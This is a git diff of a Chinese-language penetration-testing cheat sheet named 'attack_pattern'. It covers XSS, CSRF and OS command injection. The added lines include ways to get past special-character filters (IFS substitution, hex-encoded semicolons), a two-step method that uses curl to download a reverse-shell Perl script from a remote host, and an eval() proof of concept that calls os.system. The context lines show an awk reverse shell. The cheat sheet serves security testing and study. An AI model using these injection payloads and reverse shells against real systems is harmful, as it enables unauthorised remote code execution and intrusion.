@@ -1,5 +1,13 @@
 # attack_pattern
 
+## 特征
+
+- BASE64：包含大小写字母数字+/，以%3D(==)结尾
+- MD5：16字节128bit, 32个十六进制字符
+- SHA1：20字节160bit, 40个十六进制字符，每个十六进制字符代表4bit，40x4=160bit
+- SHA256: 32字节256bit, 64个十六进制字符
+
+
 ## XSS
 
 1. 尝试使用`xss"><img src=x onerror=alert(3)>`
@@ -74,7 +82,7 @@ $(document).ready(function(){
 ### 受害场景
 
 1. 受害者已登录正常网站，{==SESSIONID==}存放在{==Cookies==}中
-1. 受害者被诱骗用{==同一个浏览器==}打开非法网站
+1. 受害者被诱骗用{==同一个浏览器==}打开非法网站, 如`http://127.0.0.1:8888/csrf.html?abc=1.1.1.1`
 1. 非法网站存在访问正常网站请求脚本:
 
     ```html
@@ -522,11 +530,12 @@ public interface UserMapper {
 1. 使用`;`, `|`或`&&`直接进行命令拼接
 1. 使用`` USERID=`id -u` ``或`USERID=$(uname -a)`进行命令替换
 1. 如果遇到特殊字符校验
+
+    !!! tip "33种特殊字符`` `~!@#$%^&*()-_=+\|[{}];:'",<.>/?和空格 ``"
+
     1. `/`: 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
     1. 空格: 使用特殊变量替换: `$ a=$(curl$IFS"http://10.74.201.219:8888/")`
     1. `;`: 使用十六进制替换: `a=$'\x3b'; echo $a`, 这种方式会被当做字符串来执行
-
-    !!! tip "33种特殊字符`` `~!@#$%^&*()-_=+\|[{}];:'",<.>/?和空格 ``"
 
 1. 如果对特殊字符校验无法 {==反弹shell==}, 可分拆两步
     1. 上传反弹shell脚本, 保存到指定路径: `xxx$(curl$IFS-o"/tmp/hhack.pl"$IFS"http://x.x.x.x:8888/hhack.pl")`
@@ -604,7 +613,9 @@ $ awk 'BEGIN{s="/inet/tcp/0/192.168.1.128/8080";for(;s|&getline c;close(c))while
 !!! quote "参考链接: [你和目标只差一个shell的距离](https://klionsec.github.io/2016/09/27/revese-shell/)"
 
 
-### Java
+### 代码审计
+
+#### Java
 
 ```java
 import java.io.IOException;
@@ -632,15 +643,19 @@ public class OSi {
 
 !!! success "如果传入String[]且第一个元素不是`/bin/sh`, 则不存在命令注入"
 
-### Python格式化字符串漏洞
+#### Python
+
+调用`eval()`, 验证POC: `__import__(%27os%27).system(%27touch%20/tmp/hackkk.sh%27)`
+
+##### 格式化字符串漏洞
 
 !!! quote "[格式化字符串](../../coding/python/0x01_datatype/#_3)"
 
-### Go
+#### Go
 
 !!! quote "[OS命令注入](../../coding/go/go%E8%AF%AD%E8%A8%80%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/#os)"
 
-### Perl
+#### Perl
 
 - system()
 
